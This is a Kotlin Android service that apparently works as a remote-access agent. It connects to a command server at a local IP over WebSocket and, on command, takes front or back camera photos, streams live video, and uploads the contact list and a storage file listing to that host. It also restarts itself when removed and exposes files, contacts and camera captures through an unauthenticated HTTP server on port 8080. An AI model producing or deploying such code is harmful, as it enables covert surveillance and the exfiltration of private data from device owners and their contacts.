package com.example.alex


import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.Environment
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import fi.iki.elonen.NanoHTTPD
import fi.iki.elonen.NanoHTTPD.newChunkedResponse
import fi.iki.elonen.NanoHTTPD.newFixedLengthResponse
import java.io.File
import java.io.FileInputStream
import java.net.URLConnection
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import android.content.Context
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.provider.ContactsContract
import com.google.gson.Gson
import java.io.PipedInputStream
import java.io.PipedOutputStream
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import org.json.JSONObject
import java.net.URI
import android.os.Looper
import okhttp3.OkHttpClient
import java.net.HttpURLConnection
import java.net.URL
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import java.io.ByteArrayOutputStream
import android.Manifest



class RemoteAgentService : Service() {

    private lateinit var server: NanoHTTPD

    private var wsClient: WebSocketClient? = null
    private val deviceId = "android-device-001" // give a unique ID per device


    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
        startServer()
        connectWebSocket()
    }

    private fun connectWebSocket() {
        try {
            val serverUri = URI("ws://192.168.31.50:3003/ws") // Node.js WebSocket server
            wsClient = object : WebSocketClient(serverUri) {
                override fun onOpen(handshakedata: ServerHandshake?) {
                    println("✅ Connected to WebSocket server")
                    val registerMsg = """{"type":"hello","deviceId":"$deviceId"}"""
                    send(registerMsg)
                }

                override fun onMessage(message: String?) {
                    if (message == null) return
                    println("📩 Message from server: $message")

                    try {
                        val json = JSONObject(message)
                        val command = json.optString("type")
                        val which = json.optString("which", "")

                        when (command) {
                            "capture" -> handleCapture(which)
                            "video" -> handleVideo(which)
                            "contacts" -> handleContactsUpload()
                            "files" -> handleFileUpload()
                            "ping" -> wsClient?.send("{\"type\":\"pong\",\"deviceId\":\"$deviceId\"}")
                            else -> println("⚠️ Unknown command: $command")
                        }
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }


                override fun onClose(code: Int, reason: String?, remote: Boolean) {
                    println("❌ WebSocket closed: $reason")
                    reconnectWebSocket()
                }

                override fun onError(ex: Exception?) {
                    println("⚠️ WebSocket error: ${ex?.message}")
                    reconnectWebSocket()
                }
            }
            wsClient?.connect()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }


    private fun reconnectWebSocket() {
        Handler(Looper.getMainLooper()).postDelayed({
            println("🔁 Reconnecting WebSocket…")
            connectWebSocket()
        }, 5000)
    }

    private fun getContactsJson(): String {
        val contactsList = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null, null, null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contactsList.add(mapOf("name" to name, "number" to number))
            }
        }
        return Gson().toJson(contactsList)
    }


    private fun handleCapture(which: String) {
        val cameraList = when (which) {
            "front" -> listOf(CameraCharacteristics.LENS_FACING_FRONT)
            "back" -> listOf(CameraCharacteristics.LENS_FACING_BACK)
            "both" -> listOf(
                CameraCharacteristics.LENS_FACING_FRONT,
                CameraCharacteristics.LENS_FACING_BACK
            )
            else -> listOf(CameraCharacteristics.LENS_FACING_BACK)
        }

        Thread {
            for (facing in cameraList) {
                try {
                    val response = captureCameraImage(facing)
                    val bytes = response.data?.readBytes()
                    if (bytes != null) {
                        val whichStr =
                            if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
                        val url = URL("http://192.168.31.50:3003/capture?which=$whichStr")
                        val conn = url.openConnection() as HttpURLConnection
                        conn.requestMethod = "POST"
                        conn.doOutput = true
                        conn.setRequestProperty("Content-Type", "image/jpeg")
                        conn.outputStream.use { it.write(bytes) }
                        conn.responseCode
                        conn.disconnect()
                        println("📤 Uploaded $whichStr image")
                    }
                } catch (ex: Exception) {
                    ex.printStackTrace()
                    wsClient?.send("{\"status\":\"upload_failed\",\"error\":\"${ex.message}\"}")
                }
            }
        }.start()
    }

    private fun handleVideo(which: String) {
        val facing = if (which == "front") CameraCharacteristics.LENS_FACING_FRONT
        else CameraCharacteristics.LENS_FACING_BACK
        println("🎥 Starting video stream from ${if (which == "front") "front" else "back"} camera")
        streamCameraVideo(facing)
    }

    private fun handleContactsUpload() {
        val contactsJson = getContactsJson()
        Thread {
            try {
                val url = URL("http://192.168.31.50:3003/contacts")
                val conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                }
                val jsonBody = """{"deviceId":"$deviceId","contacts":$contactsJson}"""
                conn.outputStream.use { it.write(jsonBody.toByteArray()) }
                println("📤 Contacts uploaded: ${conn.responseCode}")
                wsClient?.send("{\"status\":\"contacts_uploaded\",\"deviceId\":\"$deviceId\"}")
            } catch (ex: Exception) {
                ex.printStackTrace()
                wsClient?.send("{\"status\":\"contacts_failed\",\"error\":\"${ex.message}\"}")
            }
        }.start()
    }

    private fun handleFileUpload() {
        val baseDir = Environment.getExternalStorageDirectory()
        val files = baseDir.listFiles()?.map {
            mapOf("name" to it.name, "path" to it.absolutePath, "isDir" to it.isDirectory)
        } ?: emptyList()

        val jsonBody = Gson().toJson(mapOf("deviceId" to deviceId, "files" to files))

        Thread {
            try {
                val url = URL("http://192.168.31.50:3003/files")
                val conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                }
                conn.outputStream.use { it.write(jsonBody.toByteArray()) }
                conn.responseCode
                println("📂 File list uploaded")
            } catch (ex: Exception) {
                ex.printStackTrace()
            }
        }.start()
    }











//    ----------------------------------------------------------------------------------



    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // If service is killed by the system, restart it
        return START_STICKY
    }

    // ✅ Add this method
    override fun onTaskRemoved(rootIntent: Intent?) {
        // Restart service if app is swiped away
        val restartServiceIntent = Intent(applicationContext, RemoteAgentService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartServiceIntent)
        } else {
            startService(restartServiceIntent)
        }
        super.onTaskRemoved(rootIntent)
    }

    private fun startServer() {
        server = object : NanoHTTPD(8080) {
            override fun serve(session: IHTTPSession): Response {
                return when {
                    session.uri.startsWith("/files") -> handleFileList(session)
                    session.uri == "/capture/front" -> captureCameraImage(CameraCharacteristics.LENS_FACING_FRONT)
                    session.uri == "/capture/back" -> captureCameraImage(CameraCharacteristics.LENS_FACING_BACK)
//                    session.uri == "/video/front" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_FRONT)
//                    session.uri == "/video/back" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_BACK)
                    session.uri == "/contacts" -> getContacts()
                    session.uri == "/status" -> newFixedLengthResponse("OK: ${System.currentTimeMillis()}")
                    else -> newFixedLengthResponse(
                        Response.Status.OK,
                        "text/html",
                        """
                        <h3>Remote Agent Active</h3>
                        <ul>
                            <li><a href='/files'>📁 Browse Files</a></li>
                            <li><a href='/contacts'>📸 Contacts</a></li>
                            <li><a href='/capture/front'>🤳 Front Camera</a></li>
                            <li><a href='/capture/back'>📸 Back Camera</a></li>
                             <li><a href='/video/front'>🤳 Front Video Camera</a></li>
                            <li><a href='/video/back'>📸 Back Video Camera</a></li>
                        </ul>
                    """.trimIndent()
                    )
                }
            }
        }
        server.start()
    }

    private fun handleFileList(session: NanoHTTPD.IHTTPSession): NanoHTTPD.Response {
        val baseDir = Environment.getExternalStorageDirectory()
        val relativePath = session.uri.removePrefix("/files").trim('/')
        val target = File(baseDir, relativePath)

        if (!target.exists()) {
            return newFixedLengthResponse(NanoHTTPD.Response.Status.NOT_FOUND, "text/plain", "404 Not Found")
        }

        // If directory → show clickable list
        if (target.isDirectory) {
            val files = target.listFiles()?.sortedBy { !it.isDirectory } ?: emptyList()
            val html = buildString {
                append("<h3>Index of /files/$relativePath</h3><ul>")
                if (relativePath.isNotEmpty()) {
                    val parent = File(relativePath).parent ?: ""
                    append("<li><a href='/files/$parent'>⬅️ Up</a></li>")
                }
                for (file in files) {
                    val name = file.name
                    val href = "/files/" + if (relativePath.isEmpty()) name else "$relativePath/$name"
                    val display = if (file.isDirectory) "📁 $name" else "📄 $name"
                    append("<li><a href='$href'>$display</a></li>")
                }
                append("</ul>")
            }
            return newFixedLengthResponse(NanoHTTPD.Response.Status.OK, "text/html", html)
        }

        // If file → download stream
        val mime = URLConnection.guessContentTypeFromName(target.name) ?: "application/octet-stream"
        val inputStream = FileInputStream(target)
        return newChunkedResponse(NanoHTTPD.Response.Status.OK, mime, inputStream)
    }

    private fun captureCameraImage(lensFacing: Int): NanoHTTPD.Response {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val resultLatch = CountDownLatch(1)
        var imageBytes: ByteArray? = null

        try {
            // Find camera ID
            val cameraId = cameraManager.cameraIdList.first { id ->
                val chars = cameraManager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == lensFacing
            }

            val reader = ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
            val handlerThread = HandlerThread("CameraThread").apply { start() }
            val handler = Handler(handlerThread.looper)

            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    captureRequest.addTarget(reader.surface)

                    camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            reader.setOnImageAvailableListener({ reader ->
                                val image = reader.acquireLatestImage()
                                val buffer = image.planes[0].buffer
                                val bytes = ByteArray(buffer.remaining())
                                buffer.get(bytes)
                                image.close()
                                imageBytes = bytes
                                session.close()
                                camera.close()
                                handlerThread.quitSafely()
                                resultLatch.countDown()
                            }, handler)
                            session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {}, handler)
                        }

                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            session.close()
                            camera.close()
                            handlerThread.quitSafely()
                            resultLatch.countDown()
                        }
                    }, handler)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    handlerThread.quitSafely()
                    resultLatch.countDown()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    handlerThread.quitSafely()
                    resultLatch.countDown()
                }
            }

            try {
                cameraManager.openCamera(cameraId, stateCallback, handler)
            } catch (e: SecurityException) {
                e.printStackTrace()
                return NanoHTTPD.newFixedLengthResponse(
                    NanoHTTPD.Response.Status.FORBIDDEN,
                    "text/plain",
                    "Camera access denied"
                )
            }
            resultLatch.await() // wait for image capture
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return if (imageBytes != null)
            NanoHTTPD.newFixedLengthResponse(
                NanoHTTPD.Response.Status.OK,
                "image/jpeg",
                java.io.ByteArrayInputStream(imageBytes),
                imageBytes!!.size.toLong()
            )
        else
            NanoHTTPD.newFixedLengthResponse(NanoHTTPD.Response.Status.INTERNAL_ERROR, "text/plain", "Failed to capture image")
    }


    private fun streamCameraVideo(lensFacing: Int) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED
        ) {
            println("❌ Camera permission not granted")
            return
        }

        val wsUrl = "ws://192.168.31.50:3003/ws" // 🔹 change to your Node.js server IP
        val client = OkHttpClient()
        val request = Request.Builder().url(wsUrl).build()
        val ws = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                println("📡 Connected to Node.js WS")
                webSocket.send("""{"type":"video_stream","deviceId":"android-device-001"}""")
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                println("❌ WebSocket failed: ${t.message}")
            }
        })

        val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
        val handlerThread = HandlerThread("VideoStreamThread").apply { start() }
        val handler = Handler(handlerThread.looper)

        try {
            val cameraId = cameraManager.cameraIdList.first { id ->
                val chars = cameraManager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == lensFacing
            }

            val reader = ImageReader.newInstance(320, 240, ImageFormat.JPEG, 2)

            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                        request.addTarget(reader.surface)

                        camera.createCaptureSession(listOf(reader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    reader.setOnImageAvailableListener({ r ->
                                        val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                                        val buffer = img.planes[0].buffer
                                        val bytes = ByteArray(buffer.remaining())
                                        buffer.get(bytes)
                                        img.close()

                                        try {
                                            ws.send(ByteString.of(*bytes)) // 🔹 send raw JPEG frame
                                        } catch (e: Exception) {
                                            println("⚠️ WS send failed: ${e.message}")
                                            camera.close()
                                            handlerThread.quitSafely()
                                        }
                                    }, handler)

                                    session.setRepeatingRequest(request.build(), null, handler)
                                }

                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    session.close()
                                    camera.close()
                                    handlerThread.quitSafely()
                                }
                            }, handler
                        )
                    } catch (e: Exception) {
                        e.printStackTrace()
                        handlerThread.quitSafely()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    handlerThread.quitSafely()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    handlerThread.quitSafely()
                }
            }

            cameraManager.openCamera(cameraId, stateCallback, handler)
        } catch (e: Exception) {
            e.printStackTrace()
            handlerThread.quitSafely()
        }
    }



    private fun getContacts(): NanoHTTPD.Response {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            return NanoHTTPD.newFixedLengthResponse(
                NanoHTTPD.Response.Status.FORBIDDEN,
                "text/plain",
                "Contacts permission not granted"
            )
        }

        val contactsList = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ),
            null,
            null,
            null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contactsList.add(mapOf("name" to name, "number" to number))
            }
        }

        val json = Gson().toJson(contactsList)
        return NanoHTTPD.newFixedLengthResponse(
            NanoHTTPD.Response.Status.OK,
            "application/json",
            json
        )
    }


    private fun createNotification(): Notification {
        val channelId = "remote_agent_channel"
        val name = "Remote Agent"
        val manager = getSystemService(NotificationManager::class.java)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, name, NotificationManager.IMPORTANCE_LOW)
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Remote Agent Active")
            .setContentText("Listening for commands on port 8080")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setOngoing(true)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        server.stop()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}